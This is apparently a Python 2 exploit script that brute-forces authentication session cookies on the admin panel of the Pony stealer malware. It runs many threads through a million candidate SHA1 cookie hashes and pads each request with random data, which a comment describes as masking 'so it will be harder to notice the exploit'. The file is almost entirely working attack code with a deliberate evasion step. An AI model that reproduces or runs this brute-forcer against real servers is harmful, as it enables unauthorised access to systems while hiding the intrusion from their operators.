#!/usr/bin/python
# Author: Rotem Kerner

from server import ControlPanelNegotiator, ControlPanelError
import sys
import getopt
import Queue
import threading
import random
import urllib2
import MySQLdb

from hashlib import sha1
from cron.audit import Log, LogType


BRUTEFORCE_MAX_OPTIONS = 1000000
OUTPUT_LOCK = threading.Lock()

def exploit(admin_cp_url, threads_count):

	if not ControlPanelNegotiator.is_admin_cp(admin_cp_url):
		raise Exception, 'The URL supplied does not appear like poney stealer admin panel.'

	""" create worker threads """


	result = Queue.Queue()
	threads = []
	hash_cookie_iter = LockedIterator(auth_cookie_gen)
	for i in range(threads_count):
		pony = ControlPanelNegotiator(admin_cp_url)
		thread = PonySessionBruteforcerThread(pony, hash_cookie_iter, result)
		threads.append(thread)
		thread.start()
	return (threads, result)


def cli_exploit():
	""" main routine """
	try:
		opts, args = getopt.getopt(sys.argv[1:], "u:t:")
	except getopt.GetoptError as err:
		print str(err)

	args = dict(opts)
	threads_count = int(args['-t'])
	admin_cp_url = args['-u']

	if not ControlPanelNegotiator.is_admin_cp(admin_cp_url):
		print "[X] The URL supplied does not appear like poney stealer admin panel."
		exit()


	print "[!] Setting up %i worker threads" % threads_count
	""" create worker threads """

	cookie_hash_iter = LockedIterator(auth_cookie_gen)
	monitor = TaskMonitorThread(cookie_hash_iter)
	monitor.start()

	for i in range(threads_count):
		pony = ControlPanelNegotiator(admin_cp_url)

		thread = PonySessionBruteforcerThread(pony, cookie_hash_iter)
		thread.start()


class TaskMonitorThread(threading.Thread):
	def __init__(self, iterator):
		self.iterator = iterator
		threading.Thread.__init__(self)


	def run(self):
		print "[!] Burteforce in progress ",
		counter = ''
		while True:
			
			counter = "(" + str(self.iterator.iter_n) + "/" + str(BRUTEFORCE_MAX_OPTIONS) + ")"
			safe_print(counter, False)
			safe_print((len(counter)+2) * "\b", False)




class PonySessionBruteforcerThread(threading.Thread):

	def __init__(self, pony, auth_cookie_gen, result = None):
		if not isinstance(pony, ControlPanelNegotiator):
			raise TypeError
		self.pony = pony
		self.cookie_gen = auth_cookie_gen
		self.result = None
		self._stop = threading.Event()
		if isinstance(result, Queue.Queue):
			self.result = result
		threading.Thread.__init__(self)


	def run(self):
		active_cookies = []
		feedback_count = 0
		failed_response_count = 0
		while True:
			if self.stopped():
				return

			#job_id, auth_cookie_hash = self.queue.get()
			try:
				job_id, auth_cookie_hash = self.cookie_gen.next()
			# last iteration?
			except StopIteration:
				self.result.put(False)

			self.pony.auth_cookie_hash = auth_cookie_hash

			masked_request = mask_request(self.pony._get_request())
			try:
				# here we are also masking the request so it will be harder to notice the exploit
				is_session_ok = self.pony.is_session_valid(masked_request)
			except ControlPanelError as e:
				# TODO: this is not a right way to handle this exception since some requests may fail
				#		because of some server error and it just might be the request containing the right session key 
				is_session_ok = False

			if is_session_ok:
				safe_print('\n[V][' + str(job_id) + '] "'+ auth_cookie_hash +'"'),
				safe_print("  - active session found")
				if isinstance(self.result, Queue.Queue): 
					self.result.put(auth_cookie_hash)

		


	def stop(self):
		self._stop.set()

	def stopped(self):
		return self._stop.isSet()

def auth_cookie_gen():
	""" auth cookie generator """
	for i in range(1000000):
		yield(i, sha1('random_salt_value_start' + str(i*0.012345) + 'random_salt_value_end').hexdigest())

class LockedIterator(object):
	def __init__(self, it):
		if not callable(it):
			raise TypeError
		self.lock = threading.Lock()
		self.it = it().__iter__()
		self.iter_n = 0

	def __iter__(self): return self

	def get_last_result(self):
		return self.iter_n

	def next(self):
		self.lock.acquire()
		try:
			self.iter_n += 1
			return self.it.next()
		finally:
			self.lock.release()


def mask_request(request):
	if not isinstance(request, urllib2.Request):
		raise TypeError,'first argument must be of a %s' % type(urllib2.Reqest)

	request.add_data(''.join(chr(random.randint(0,255)) for x in range(random.randint(10,50))).encode('base64'))
	return request


def safe_print(output, newline = True):
	OUTPUT_LOCK.acquire()
	if newline:
		print output
	else:
		print output,

	OUTPUT_LOCK.release()

if __name__ == "__main__":
	cli_exploit()
